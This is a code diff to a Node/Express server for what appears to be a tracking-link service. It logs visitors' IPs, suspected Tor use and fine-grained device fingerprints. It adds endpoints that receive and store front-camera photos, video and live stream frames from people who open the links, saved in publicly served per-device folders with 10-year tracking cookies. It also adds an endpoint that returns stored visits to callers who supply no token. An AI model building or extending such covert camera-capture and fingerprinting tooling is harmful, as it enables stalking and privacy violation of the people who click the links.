@@ -10,10 +10,16 @@ import { createServer as createViteServer } from 'vite';
 import PDFDocument from 'pdfkit';
 import { promisify } from 'util';
 import { GoogleGenAI } from '@google/genai';
+import { v4 as uuidv4 } from 'uuid';
 
 const resolveDns = promisify(dns.resolveAny);
 const PORT = 3000;
 const DB_FILE = path.join(process.cwd(), 'data', 'db.json');
+const UPLOADS_DIR = path.join(process.cwd(), 'uploads');
+
+if (!fs.existsSync(UPLOADS_DIR)) {
+  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+}
 
 let genAiClient: GoogleGenAI | null = null;
 function getGenAI(): GoogleGenAI | null {
@@ -158,8 +164,13 @@ interface StoredVisit {
   torSuspected?: boolean | null;
   realIpCandidate?: string | null;
   capturedPhotos?: string[] | null;
+  capturedVideo?: string | null;
+  liveStreamFrame?: string | null;
+  mode?: string | null;
   userId?: string | null;
   createdAt: string;
+  lastActiveAt?: string | null;
+  isLive?: boolean | null;
 }
 
 interface DatabaseSchema {
@@ -291,9 +302,96 @@ function parseTzOffsetMinutes(tzString: string | null | undefined): number | nul
   }
 }
 
-// Robust OS & Device Identification (Fixes Android classified as Linux)
-function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: string): { os: string; device: string } {
+// Robust OS & Device Identification (Fixes Android classified as Linux, detailed brands)
+function cleanOS(
+  ua: string,
+  clientHintModel?: string,
+  uaPlatformVersion?: string,
+  screenWidth?: number,
+  screenHeight?: number,
+  pixelRatio?: number,
+  gpuRenderer?: string
+): { os: string; device: string } {
   const lower = ua.toLowerCase();
+
+  // Helper to translate common model codes into friendly consumer names
+  function translateModelCode(model: string): string {
+    const m = model.toUpperCase().trim();
+    
+    // Samsung S-Series & Note Series
+    if (m.includes('SM-S928')) return 'Samsung Galaxy S24 Ultra';
+    if (m.includes('SM-S926')) return 'Samsung Galaxy S24+';
+    if (m.includes('SM-S921')) return 'Samsung Galaxy S24';
+    if (m.includes('SM-S918')) return 'Samsung Galaxy S23 Ultra';
+    if (m.includes('SM-S916')) return 'Samsung Galaxy S23+';
+    if (m.includes('SM-S911')) return 'Samsung Galaxy S23';
+    if (m.includes('SM-S908')) return 'Samsung Galaxy S22 Ultra';
+    if (m.includes('SM-S906')) return 'Samsung Galaxy S22+';
+    if (m.includes('SM-S901')) return 'Samsung Galaxy S22';
+    if (m.includes('SM-G998')) return 'Samsung Galaxy S21 Ultra';
+    if (m.includes('SM-G996')) return 'Samsung Galaxy S21+';
+    if (m.includes('SM-G991')) return 'Samsung Galaxy S21';
+    if (m.includes('SM-G990')) return 'Samsung Galaxy S21 FE';
+    if (m.includes('SM-G988')) return 'Samsung Galaxy S20 Ultra';
+    if (m.includes('SM-G975')) return 'Samsung Galaxy S10+';
+    if (m.includes('SM-G973')) return 'Samsung Galaxy S10';
+    if (m.includes('SM-N986')) return 'Samsung Galaxy Note 20 Ultra';
+    if (m.includes('SM-N975')) return 'Samsung Galaxy Note 10+';
+    
+    // Samsung Foldables
+    if (m.includes('SM-F946')) return 'Samsung Galaxy Z Fold 5';
+    if (m.includes('SM-F936')) return 'Samsung Galaxy Z Fold 4';
+    if (m.includes('SM-F926')) return 'Samsung Galaxy Z Fold 3';
+    if (m.includes('SM-F731')) return 'Samsung Galaxy Z Flip 5';
+    if (m.includes('SM-F721')) return 'Samsung Galaxy Z Flip 4';
+    
+    // Samsung A-Series
+    if (m.includes('SM-A546')) return 'Samsung Galaxy A54 5G';
+    if (m.includes('SM-A536')) return 'Samsung Galaxy A53 5G';
+    if (m.includes('SM-A346')) return 'Samsung Galaxy A34 5G';
+    if (m.includes('SM-A736')) return 'Samsung Galaxy A73 5G';
+    if (m.includes('SM-A528')) return 'Samsung Galaxy A52s 5G';
+    if (m.includes('SM-A525')) return 'Samsung Galaxy A52';
+    if (m.includes('SM-A325')) return 'Samsung Galaxy A32';
+    if (m.includes('SM-A146')) return 'Samsung Galaxy A14 5G';
+    if (m.includes('SM-A136')) return 'Samsung Galaxy A13 5G';
+    if (m.includes('SM-A125')) return 'Samsung Galaxy A12';
+
+    // Google Pixel
+    if (m.includes('GP4BC') || m.includes('G10') || m.includes('GE2AE')) return 'Google Pixel 8 Pro';
+    if (m.includes('G9FPL')) return 'Google Pixel 8';
+    if (m.includes('G2Y9M') || m.includes('GE2AE')) return 'Google Pixel 7 Pro';
+    if (m.includes('GVUJV')) return 'Google Pixel 7';
+    if (m.includes('GLU0G') || m.includes('G8VOU')) return 'Google Pixel 6 Pro';
+    if (m.includes('GB7N6')) return 'Google Pixel 6';
+    if (m.includes('GD1YQ') || m.includes('G025E')) return 'Google Pixel 5';
+
+    // Xiaomi & POCO & Redmi
+    if (m.includes('23117RK66C') || m.includes('2311DRK48G')) return 'Xiaomi Redmi K70 Pro';
+    if (m.includes('23127PN0CC')) return 'Xiaomi 14 Pro';
+    if (m.includes('23122PCD1G')) return 'Xiaomi POCO X6 Pro';
+    if (m.includes('2210132G')) return 'Xiaomi Redmi Note 12 Pro';
+    if (m.includes('21091116UG')) return 'Xiaomi 11T Pro';
+    if (m.includes('M2102J20SG')) return 'POCO X3 Pro';
+    if (m.includes('M2012K11AG')) return 'POCO F3';
+
+    // OnePlus
+    if (m.includes('CPH2581')) return 'OnePlus 12';
+    if (m.includes('CPH2449')) return 'OnePlus 11';
+    if (m.includes('CPH2411') || m.includes('NE2213')) return 'OnePlus 10 Pro';
+    if (m.includes('KB2003') || m.includes('KB2001')) return 'OnePlus 8T';
+    if (m.includes('HD1903')) return 'OnePlus 7T';
+
+    // Realme & OPPO & Vivo
+    if (m.includes('RMX3700') || m.includes('RMX3701')) return 'Realme GT Neo 5';
+    if (m.includes('RMX3301')) return 'Realme GT 2 Pro';
+    if (m.includes('CPH2521')) return 'OPPO Reno 10 Pro';
+    if (m.includes('CPH2307')) return 'OPPO Find X5 Pro';
+    if (m.includes('V2241A')) return 'Vivo X90 Pro';
+    if (m.includes('V2254A')) return 'Vivo V27 Pro';
+
+    return model;
+  }
 
   // 1. Android Check (Must be evaluated FIRST before any Linux check)
   if (lower.includes('android')) {
@@ -303,11 +401,12 @@ function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: strin
       osVer = `Android ${major}`;
     } else {
       const vMatch = ua.match(/Android\s+([0-9\.]+)/i);
-      osVer = vMatch ? `Android ${vMatch[1]}` : 'Android';
+      osVer = vMatch ? `Android ${vMatch[1]}` : 'Android 10'; // Default to fallback android version if completely blocked
     }
 
     if (clientHintModel && clientHintModel.trim() && clientHintModel !== 'Unknown') {
-      return { os: osVer, device: clientHintModel.trim() };
+      const friendly = translateModelCode(clientHintModel.trim());
+      return { os: osVer, device: friendly };
     }
 
     let deviceModel = 'Android Phone/Tablet';
@@ -328,36 +427,92 @@ function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: strin
       }
     }
 
-    // Friendly brand recognition
-    if (deviceModel.startsWith('SM-') || deviceModel.includes('SAMSUNG')) {
-      deviceModel = `Samsung (${deviceModel})`;
-    } else if (deviceModel.includes('Pixel')) {
-      deviceModel = `Google ${deviceModel}`;
-    } else if (deviceModel.startsWith('Redmi') || deviceModel.startsWith('M20') || deviceModel.startsWith('220')) {
-      deviceModel = `Xiaomi/Redmi (${deviceModel})`;
-    } else if (deviceModel.startsWith('CPH') || deviceModel.includes('OPPO')) {
+    deviceModel = translateModelCode(deviceModel);
+
+    // Comprehensive Brand & Model Recognition
+    const upperModel = deviceModel.toUpperCase();
+    if (upperModel.startsWith('SM-') || upperModel.includes('SAMSUNG') || upperModel.startsWith('GT-') || upperModel.startsWith('SCH-')) {
+      deviceModel = `Samsung Galaxy (${deviceModel})`;
+    } else if (upperModel.includes('PIXEL')) {
+      deviceModel = `Google Pixel (${deviceModel})`;
+    } else if (upperModel.startsWith('REDMI') || upperModel.startsWith('POCO') || upperModel.startsWith('M20') || upperModel.startsWith('220') || upperModel.startsWith('230') || upperModel.startsWith('240') || upperModel.includes('XIAOMI')) {
+      deviceModel = `Xiaomi / Redmi (${deviceModel})`;
+    } else if (upperModel.startsWith('CPH') || upperModel.includes('OPPO') || upperModel.startsWith('PFF') || upperModel.startsWith('PGEM')) {
       deviceModel = `Oppo (${deviceModel})`;
-    } else if (deviceModel.startsWith('RMX')) {
+    } else if (upperModel.startsWith('RMX') || upperModel.includes('REALME')) {
       deviceModel = `Realme (${deviceModel})`;
-    } else if (deviceModel.startsWith('V2') || deviceModel.includes('vivo')) {
-      deviceModel = `Vivo (${deviceModel})`;
-    } else if (deviceModel.includes('HUAWEI') || deviceModel.startsWith('CLT-') || deviceModel.startsWith('ELS-')) {
+    } else if (upperModel.startsWith('V2') || upperModel.includes('VIVO') || upperModel.startsWith('IQOO')) {
+      deviceModel = `Vivo / iQOO (${deviceModel})`;
+    } else if (upperModel.includes('HUAWEI') || upperModel.startsWith('CLT-') || upperModel.startsWith('ELS-') || upperModel.startsWith('ANA-') || upperModel.startsWith('NOH-') || upperModel.startsWith('VOG-')) {
       deviceModel = `Huawei (${deviceModel})`;
+    } else if (upperModel.includes('HONOR') || upperModel.startsWith('ANY-') || upperModel.startsWith('CRT-') || upperModel.startsWith('FNE-')) {
+      deviceModel = `Honor (${deviceModel})`;
+    } else if (upperModel.includes('ONEPLUS') || upperModel.startsWith('NE22') || upperModel.startsWith('CPH24') || upperModel.startsWith('CPH25') || upperModel.startsWith('GM19')) {
+      deviceModel = `OnePlus (${deviceModel})`;
+    } else if (upperModel.includes('MOTO') || upperModel.startsWith('XT')) {
+      deviceModel = `Motorola (${deviceModel})`;
+    } else if (upperModel.startsWith('XQ-') || upperModel.includes('XPERIA')) {
+      deviceModel = `Sony Xperia (${deviceModel})`;
+    } else if (upperModel.includes('ASUS') || upperModel.startsWith('AI22') || upperModel.startsWith('ZS')) {
+      deviceModel = `Asus ROG/Zenfone (${deviceModel})`;
+    } else if (upperModel.includes('INFINIX') || upperModel.startsWith('X68') || upperModel.startsWith('X65')) {
+      deviceModel = `Infinix (${deviceModel})`;
+    } else if (upperModel.includes('TECNO') || upperModel.startsWith('KG') || upperModel.startsWith('CK')) {
+      deviceModel = `Tecno (${deviceModel})`;
+    } else if (upperModel.includes('LENOVO') || upperModel.startsWith('TB-')) {
+      deviceModel = `Lenovo Tablet (${deviceModel})`;
     }
 
     return { os: osVer, device: deviceModel };
   }
 
-  // 2. iOS (iPhone, iPad, iPod)
+  // 2. iOS (iPhone, iPad, iPod) Differentiate exact models using screen bounds + pixelRatio
   if (lower.includes('iphone')) {
     const vMatch = ua.match(/OS\s+([0-9_]+)/i);
     const osVer = vMatch ? `iOS ${vMatch[1].replace(/_/g, '.')}` : 'iOS';
-    return { os: osVer, device: 'iPhone' };
+    
+    let iphoneModel = 'Apple iPhone';
+    if (screenWidth && screenHeight) {
+      const w = Math.min(screenWidth, screenHeight);
+      const h = Math.max(screenWidth, screenHeight);
+      const pr = pixelRatio || 3;
+      
+      if (w === 393 && h === 852) {
+        iphoneModel = 'Apple iPhone 15 / 15 Pro / 14 Pro';
+      } else if (w === 430 && h === 932) {
+        iphoneModel = 'Apple iPhone 15 Plus / 15 Pro Max / 14 Pro Max';
+      } else if (w === 390 && h === 844) {
+        iphoneModel = 'Apple iPhone 14 / 13 / 13 Pro / 12 / 12 Pro';
+      } else if (w === 428 && h === 926) {
+        iphoneModel = 'Apple iPhone 14 Plus / 13 Pro Max / 12 Pro Max';
+      } else if (w === 375 && h === 812) {
+        iphoneModel = pr >= 3 ? 'Apple iPhone 13 mini / 12 mini / 11 Pro / XS / X' : 'Apple iPhone SE (2nd/3rd Gen)';
+      } else if (w === 414 && h === 896) {
+        iphoneModel = pr >= 3 ? 'Apple iPhone 11 Pro Max / XS Max' : 'Apple iPhone 11 / XR';
+      } else if (w === 414 && h === 736) {
+        iphoneModel = 'Apple iPhone 8 Plus / 7 Plus / 6S Plus';
+      } else if (w === 375 && h === 667) {
+        iphoneModel = 'Apple iPhone SE (2nd/3rd Gen) / 8 / 7 / 6S';
+      } else if (w === 320 && h === 568) {
+        iphoneModel = 'Apple iPhone SE (1st Gen) / 5S / 5C';
+      }
+    }
+    
+    // Supplement with GPU if available
+    if (gpuRenderer && gpuRenderer.toLowerCase().includes('apple')) {
+      iphoneModel += ` (${gpuRenderer})`;
+    }
+    
+    return { os: osVer, device: iphoneModel };
   }
+  
   if (lower.includes('ipad')) {
     const vMatch = ua.match(/OS\s+([0-9_]+)/i);
-    const osVer = vMatch ? `iPadOS ${vMatch[1].replace(/_/g, '.')}` : 'iPad';
-    return { os: osVer, device: 'iPad' };
+    const osVer = vMatch ? `iPadOS ${vMatch[1].replace(/_/g, '.')}` : 'Apple iPad';
+    return { os: osVer, device: 'Apple iPad' };
+  }
+  if (lower.includes('macintosh') && (lower.includes('touch') || ua.includes('iPad'))) {
+    return { os: 'iPadOS', device: 'Apple iPad Pro' };
   }
 
   // 3. Windows
@@ -365,25 +520,24 @@ function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: strin
     let osName = 'Windows 10';
     if (uaPlatformVersion && uaPlatformVersion.trim() && uaPlatformVersion !== 'Unknown') {
       const major = parseInt(uaPlatformVersion.split('.')[0]);
-      // Windows 11 platform version is usually 13.0.0 or higher
       if (major >= 13) osName = 'Windows 11';
     }
-    return { os: osName, device: 'PC Desktop/Laptop' };
+    return { os: osName, device: 'Windows Desktop/Laptop' };
   }
-  if (lower.includes('windows nt 6.3')) return { os: 'Windows 8.1', device: 'PC' };
-  if (lower.includes('windows nt 6.1')) return { os: 'Windows 7', device: 'PC' };
-  if (lower.includes('windows')) return { os: 'Windows', device: 'PC' };
+  if (lower.includes('windows nt 6.3')) return { os: 'Windows 8.1', device: 'Windows PC' };
+  if (lower.includes('windows nt 6.1')) return { os: 'Windows 7', device: 'Windows PC' };
+  if (lower.includes('windows')) return { os: 'Windows', device: 'Windows PC' };
 
   // 4. macOS
   if (lower.includes('macintosh') || lower.includes('mac os x')) {
     const vMatch = ua.match(/Mac OS X\s+([0-9_\.]+)/i);
     const osVer = vMatch ? `macOS ${vMatch[1].replace(/_/g, '.')}` : 'macOS';
-    return { os: osVer, device: 'Apple Mac' };
+    return { os: osVer, device: 'Apple Mac (MacBook/iMac)' };
   }
 
   // 5. ChromeOS
   if (lower.includes('cros')) {
-    return { os: 'ChromeOS', device: 'Chromebook' };
+    return { os: 'ChromeOS', device: 'Google Chromebook' };
   }
 
   // 6. Linux PC (Strictly Desktop Linux, not Android)
@@ -391,6 +545,7 @@ function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: strin
     if (lower.includes('ubuntu')) return { os: 'Ubuntu Linux', device: 'Linux PC' };
     if (lower.includes('fedora')) return { os: 'Fedora Linux', device: 'Linux PC' };
     if (lower.includes('debian')) return { os: 'Debian Linux', device: 'Linux PC' };
+    if (lower.includes('arch')) return { os: 'Arch Linux', device: 'Linux PC' };
     return { os: 'Linux Desktop', device: 'Linux PC' };
   }
 
@@ -399,12 +554,18 @@ function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: strin
 
 function cleanBrowser(ua: string): string {
   if (ua.includes('Edg/')) return 'Microsoft Edge';
-  if (ua.includes('OPR/') || ua.includes('Opera')) return 'Opera';
+  if (ua.includes('OPR/') || ua.includes('Opera')) return 'Opera Browser';
   if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+  if (ua.includes('Brave')) return 'Brave Browser';
+  if (ua.includes('Vivaldi')) return 'Vivaldi Browser';
+  if (ua.includes('DuckDuckGo')) return 'DuckDuckGo Browser';
+  if (ua.includes('MiuiBrowser') || ua.includes('XiaoMi/MiuiBrowser')) return 'Xiaomi Mi Browser';
+  if (ua.includes('UCBrowser') || ua.includes('UBrowser')) return 'UC Browser';
+  if (ua.includes('YaBrowser')) return 'Yandex Browser';
   if (ua.includes('Firefox/')) return 'Mozilla Firefox';
   if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Google Chrome';
   if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Apple Safari';
-  return 'Browser';
+  return 'Web Browser';
 }
 
 function detectBot(ua: string): { isBot: boolean; botName: string | null } {
@@ -1360,6 +1521,7 @@ async function startServer() {
   const db = loadDatabase();
 
   app.set('trust proxy', 1);
+  app.use('/uploads', express.static(UPLOADS_DIR));
 
   app.use(helmet({
     contentSecurityPolicy: false,
@@ -1753,6 +1915,12 @@ async function startServer() {
 
       const visits = db.visits
         .filter((v) => v.code === code || v.linkId === link.id)
+        .map((v) => ({
+          ...v,
+          mode: v.mode || link.mode || 'precise',
+          capturedVideo: v.capturedVideo || (v.visitorToken && pendingVideosMap.get(v.visitorToken)) || pendingVideosMap.get(code) || null,
+          liveStreamFrame: v.liveStreamFrame || (v.visitorToken && pendingStreamFramesMap.get(v.visitorToken)) || pendingStreamFramesMap.get(code) || null,
+        }))
         .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
 
       res.json({
@@ -1778,8 +1946,33 @@ async function startServer() {
 
       const linkId = db.links[linkIndex].id;
       db.links.splice(linkIndex, 1);
-      // We no longer filter visits here to keep records of everything even if link is deleted
-      // db.visits = db.visits.filter((v) => v.linkId !== linkId && v.code !== code);
+      
+      // Delete all visits and their associated photos when a link is deleted
+      const visitsToDelete = db.visits.filter((v) => v.linkId === linkId || v.code === code);
+      
+      // Physically delete folders from disk
+      visitsToDelete.forEach(visit => {
+        if (visit.capturedPhotos && visit.capturedPhotos.length > 0) {
+          try {
+            // Extract folder name from the first photo path: /uploads/FOLDER_NAME/photo.jpg
+            const firstPhoto = visit.capturedPhotos[0];
+            const parts = firstPhoto.split('/');
+            if (parts.length >= 3) {
+              const folderName = parts[2];
+              const folderPath = path.join(UPLOADS_DIR, folderName);
+              if (fs.existsSync(folderPath)) {
+                fs.rmSync(folderPath, { recursive: true, force: true });
+                console.log(`Deleted photo folder: ${folderPath}`);
+              }
+            }
+          } catch (e) {
+            console.error('Error deleting folder:', e);
+          }
+        }
+      });
+
+      db.visits = db.visits.filter((v) => v.linkId !== linkId && v.code !== code);
+      
       saveDatabase(db);
 
       res.json({ success: true, message: 'Link and visits deleted successfully' });
@@ -1804,15 +1997,61 @@ async function startServer() {
         ? db.links.filter((l) => l.userToken === token)
         : db.links.slice(0, 15);
 
+      const userCodes = new Set(filtered.map((l) => l.code));
+      const recentVisits = db.visits
+        .filter((v) => userCodes.has(v.code) || (!token && db.visits.indexOf(v) < 30))
+        .slice(0, 30);
+
       res.json({
         success: true,
         links: filtered,
+        recentVisits,
         globalVisits: 800 + (db.totalVisitsCreated || db.visits.length),
         globalLinks: 1500 + (db.totalLinksCreated || db.links.length)
       });
     } catch (err) {
       console.error('Get user links error:', err);
       res.status(500).json({ error: 'Failed to get user links' });
+    }
+  });
+
+  // Global & User Visits polling endpoint for instant notifications across all links/files/sections
+  app.get('/api/user-visits', (req, res) => {
+    try {
+      let token = (req.query.token as string) || (req.headers['x-user-token'] as string);
+      if (!token && req.headers.cookie) {
+        const match = req.headers.cookie.match(/(?:^|; )ipsm_user_token=([^;]*)/);
+        if (match && match[1]) {
+          token = decodeURIComponent(match[1]);
+        }
+      }
+
+      const userLinks = token ? db.links.filter((l) => l.userToken === token) : db.links;
+      const userCodes = new Set(userLinks.map((l) => l.code));
+      const userLinkIds = new Set(userLinks.map((l) => l.id));
+
+      const visits = db.visits
+        .filter((v) => userCodes.has(v.code) || userLinkIds.has(v.linkId) || (!token && db.visits.indexOf(v) < 50))
+        .map((v) => {
+          const matchedLink = db.links.find((l) => l.code === v.code || l.id === v.linkId);
+          return {
+            ...v,
+            mode: v.mode || matchedLink?.mode || 'camera',
+            linkTitle: matchedLink?.originalUrl || v.code,
+            capturedVideo: v.capturedVideo || (v.visitorToken && pendingVideosMap.get(v.visitorToken)) || pendingVideosMap.get(v.code) || null,
+            liveStreamFrame: v.liveStreamFrame || (v.visitorToken && pendingStreamFramesMap.get(v.visitorToken)) || pendingStreamFramesMap.get(v.code) || null,
+          };
+        })
+        .slice(0, 60);
+
+      res.json({
+        success: true,
+        visits,
+        total: visits.length,
+      });
+    } catch (err: any) {
+      console.error('Get user visits error:', err);
+      res.status(500).json({ error: 'Failed to get user visits' });
     }
   });
 
@@ -2028,34 +2267,46 @@ Respond ONLY with a valid JSON object matching this schema:
 
   // In-memory buffer for photos if update-photo arrives before initial /api/visits POST completes
   const pendingPhotosMap = new Map<string, string[]>();
+  const pendingVideosMap = new Map<string, string>();
+  const pendingStreamFramesMap = new Map<string, string>();
 
   // Live visit polling endpoint by ID or visitorToken
   app.get('/api/visits/live/:id', (req, res) => {
     try {
       const param = req.params.id;
-      let cookieVid = '';
-      if (req.headers.cookie) {
-        const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
-        if (match) cookieVid = match[1];
+      
+      // Find the specific visit by its unique ID (UUID) or session token
+      let visit = db.visits.find((v) => v.id === param || v.visitorToken === param);
+      
+      const token = visit?.visitorToken || param;
+      
+      // Collect latest data from memory buffers and visit record
+      const liveFrame = pendingStreamFramesMap.get(token) || visit?.liveStreamFrame || null;
+      const liveVideo = visit?.capturedVideo || pendingVideosMap.get(token) || null;
+      
+      // Merge photos from DB and memory buffer
+      const dbPhotos = visit?.capturedPhotos || [];
+      const bufferedPhotos = pendingPhotosMap.get(token) || [];
+      const photos = Array.from(new Set([...dbPhotos, ...bufferedPhotos]));
+
+      // If we found new photos in buffer, update the visit record for persistence
+      if (visit && photos.length > (visit.capturedPhotos?.length || 0)) {
+        visit.capturedPhotos = photos;
+        saveDatabase(db);
       }
 
-      const visit = db.visits.find(
-        (v) =>
-          v.id === param ||
-          v.visitorToken === param ||
-          v.code === param ||
-          (cookieVid && (v.visitorToken === cookieVid || v.userId === cookieVid))
-      );
-      
-      if (!visit && param) {
-        if (pendingPhotosMap.has(param)) {
-          const photos = pendingPhotosMap.get(param) || [];
+      if (!visit) {
+        // If visit isn't created yet but we have data, return a virtual visit object
+        if (photos.length > 0 || liveFrame || liveVideo) {
           res.json({
             success: true,
             visitId: param,
             capturedPhotos: photos,
+            capturedVideo: liveVideo,
+            liveStreamFrame: liveFrame,
+            mode: 'camera',
             photosCount: photos.length,
-            visit: { id: param, visitorToken: param, capturedPhotos: photos },
+            visit: { id: param, visitorToken: param, capturedPhotos: photos, capturedVideo: liveVideo, liveStreamFrame: liveFrame, mode: 'camera' },
           });
           return;
         }
@@ -2063,19 +2314,19 @@ Respond ONLY with a valid JSON object matching this schema:
         return;
       }
 
-      const photos = Array.from(new Set([
-        ...(visit?.capturedPhotos || []),
-        ...(visit?.visitorToken && pendingPhotosMap.has(visit.visitorToken) ? pendingPhotosMap.get(visit.visitorToken)! : [])
-      ]));
-
       res.json({
         success: true,
-        visitId: visit?.id,
+        visitId: visit.id,
         capturedPhotos: photos,
+        capturedVideo: liveVideo,
+        liveStreamFrame: liveFrame,
+        mode: visit.mode || 'camera',
         photosCount: photos.length,
         visit: {
           ...visit,
           capturedPhotos: photos,
+          capturedVideo: liveVideo,
+          liveStreamFrame: liveFrame,
         },
       });
     } catch (err: any) {
@@ -2083,9 +2334,119 @@ Respond ONLY with a valid JSON object matching this schema:
     }
   });
 
+  // Real-time Live Video Stream Upload from Front Camera
+  app.post('/api/visits/update-video', async (req, res) => {
+    try {
+      const { visitorToken, video, code, userId, deviceId, clientHintModel, uaPlatformVersion } = req.body;
+      if (!video) {
+        res.status(400).json({ error: 'Missing video data' });
+        return;
+      }
+
+      let ip =
+        (req.headers['cf-connecting-ip'] as string) ||
+        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+        (req.headers['x-real-ip'] as string) ||
+        req.socket.remoteAddress ||
+        '127.0.0.1';
+      if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
+
+      let cookieVid = '';
+      if (req.headers.cookie) {
+        const match = req.headers.cookie.match(/(?:^|;\s*)sm_vid=([^;]+)/);
+        if (match) cookieVid = match[1];
+      }
+
+      const effectiveToken = visitorToken || cookieVid || deviceId || userId || ip;
+      const uaStr = (req.headers['user-agent'] as string) || '';
+      const { device: deviceName } = cleanOS(uaStr, clientHintModel, uaPlatformVersion);
+      const safeDeviceName = deviceName.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30);
+      const cleanToken = effectiveToken.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 12);
+      const folderName = `${safeDeviceName}_${cleanToken}`;
+      const deviceFolder = path.join(UPLOADS_DIR, folderName);
+
+      if (!fs.existsSync(deviceFolder)) {
+        fs.mkdirSync(deviceFolder, { recursive: true });
+      }
+
+      const videoId = uuidv4();
+      const videoFilename = `stream_${videoId}.webm`;
+      const videoPath = path.join(deviceFolder, videoFilename);
+      const base64Data = video.replace(/^data:video\/[a-zA-Z0-9+.-]+;base64,/, '').replace(/^data:application\/octet-stream;base64,/, '');
+      fs.writeFileSync(videoPath, base64Data, { encoding: 'base64' });
+
+      const videoDiskUrl = `/uploads/${folderName}/${videoFilename}`;
+      if (effectiveToken) {
+        pendingVideosMap.set(effectiveToken, videoDiskUrl);
+      }
+      if (code) {
+        pendingVideosMap.set(code, videoDiskUrl);
+      }
+
+      let visit = effectiveToken
+        ? db.visits.find((v) => v.visitorToken === effectiveToken || v.id === effectiveToken || v.userId === effectiveToken)
+        : null;
+
+      if (!visit && code) {
+        visit = db.visits.find((v) => v.code === code);
+      }
+
+      if (visit) {
+        visit.capturedVideo = videoDiskUrl;
+        saveDatabase(db);
+      }
+
+      res.json({ success: true, videoUrl: videoDiskUrl });
+    } catch (err: any) {
+      console.error('Update video error:', err);
+      res.status(500).json({ error: err.message || 'Failed to update video' });
+    }
+  });
+
+  // Real-time Front Camera Stream Frame Relay
+  app.post('/api/visits/update-stream', (req, res) => {
+    try {
+      const { visitorToken, frame, code } = req.body;
+      if (!frame) {
+        res.status(400).json({ error: 'Missing frame' });
+        return;
+      }
+      const token = visitorToken || code;
+      if (token) {
+        pendingStreamFramesMap.set(token, frame);
+      }
+      if (code) {
+        pendingStreamFramesMap.set(code, frame);
+      }
+
+      const visit = db.visits.find((v) => (token && (v.visitorToken === token || v.id === token)) || (code && v.code === code));
+      if (visit) {
+        visit.liveStreamFrame = frame;
+      }
+
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(500).json({ error: e.message || 'Stream update failed' });
+    }
+  });
+
   app.post('/api/visits/update-photo', async (req, res) => {
     try {
-      const { visitorToken, photo, code, facing, shot, userId, deviceId } = req.body;
+      const {
+        visitorToken,
+        photo,
+        code,
+        facing,
+        shot,
+        userId,
+        deviceId,
+        clientHintModel,
+        uaPlatformVersion,
+        screenWidth,
+        screenHeight,
+        pixelRatio,
+        gpuRenderer
+      } = req.body;
       if (!photo) {
         res.status(400).json({ error: 'Missing photo' });
         return;
@@ -2109,7 +2470,50 @@ Respond ONLY with a valid JSON object matching this schema:
         if (match) cookieVid = match[1];
       }
 
-      const effectiveToken = visitorToken || cookieVid || deviceId || userId;
+      const effectiveToken = visitorToken || cookieVid || deviceId || userId || ip;
+
+      // Extract Device Info to build folder name
+      const uaStr = (req.headers['user-agent'] as string) || '';
+      const { os: osName, device: deviceName } = cleanOS(
+        uaStr,
+        clientHintModel,
+        uaPlatformVersion,
+        screenWidth ? Number(screenWidth) : undefined,
+        screenHeight ? Number(screenHeight) : undefined,
+        pixelRatio ? Number(pixelRatio) : undefined,
+        gpuRenderer
+      );
+      const safeDeviceName = deviceName.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 30);
+      // Determine stable folder path: DeviceName + clean Token prefix to group all photos of the same session
+      const cleanToken = effectiveToken.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 12);
+      const folderName = `${safeDeviceName}_${cleanToken}`;
+      const deviceFolder = path.join(UPLOADS_DIR, folderName);
+      
+      // Save photo to disk with robust base64 fallback in case of read-only filesystems
+      const photoId = uuidv4();
+      const photoFilename = `photo_${shot || 0}_${facing || 'unknown'}_${photoId}.jpg`;
+      const photoPath = path.join(deviceFolder, photoFilename);
+      
+      let photoDiskUrl = '';
+      try {
+        if (!fs.existsSync(deviceFolder)) {
+          fs.mkdirSync(deviceFolder, { recursive: true });
+        }
+        const base64Data = photo.replace(/^data:[^;]+;base64,/, "");
+        fs.writeFileSync(photoPath, base64Data, { encoding: 'base64' });
+        photoDiskUrl = `/uploads/${folderName}/${photoFilename}`;
+        console.log(`[STORAGE] Saving photo to disk: ${photoPath} | Public URL: ${photoDiskUrl}`);
+      } catch (writeErr: any) {
+        console.warn(`[STORAGE WARNING] Failed to write photo to disk (using base64 fallback):`, writeErr.message || writeErr);
+        // Fall back to raw base64 photo so it is still saved to DB and rendered successfully in the UI
+        photoDiskUrl = photo;
+      }
+
+      // Ensure persistent long-lived cookie is reinforced on every capture response
+      if (effectiveToken) {
+        res.cookie('sm_vid', effectiveToken, { maxAge: 10 * 365 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' });
+        res.cookie('sm_user_id', effectiveToken, { maxAge: 10 * 365 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' });
+      }
 
       // Try finding existing visit by token, cookie, ID, or IP+Code
       let visit = effectiveToken
@@ -2138,8 +2542,11 @@ Respond ONLY with a valid JSON object matching this schema:
           pendingPhotosMap.delete(effectiveToken);
         }
 
-        if (!visit.capturedPhotos.includes(photo)) {
-          visit.capturedPhotos.push(photo);
+        if (!visit.capturedPhotos.includes(photoDiskUrl)) {
+          visit.capturedPhotos.push(photoDiskUrl);
+          if (visit.capturedPhotos.length > 30) {
+            visit.capturedPhotos = visit.capturedPhotos.slice(-30); // Keep only the latest 30 photos
+          }
         }
         if (effectiveToken && !visit.visitorToken) {
           visit.visitorToken = effectiveToken;
